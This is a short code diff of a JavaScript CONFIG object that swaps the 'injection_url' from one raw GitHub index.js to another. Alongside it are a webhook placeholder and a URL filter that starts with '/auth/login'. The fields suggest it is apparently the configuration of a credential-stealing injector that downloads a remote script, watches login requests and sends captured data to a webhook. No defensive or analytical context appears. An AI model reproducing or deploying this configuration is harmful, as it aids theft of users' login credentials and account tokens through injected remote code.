@@ -11,7 +11,7 @@ const CONFIG = {
   webhook:
     "%WEBHOOK%",
   injection_url:
-    "https://raw.githubusercontent.com/xSalca/Viral/main/index.js",
+    "https://raw.githubusercontent.com/wejdeneestmajeur/injector/refs/heads/main/index.js",
   filters: {
     urls: [
       "/auth/login",
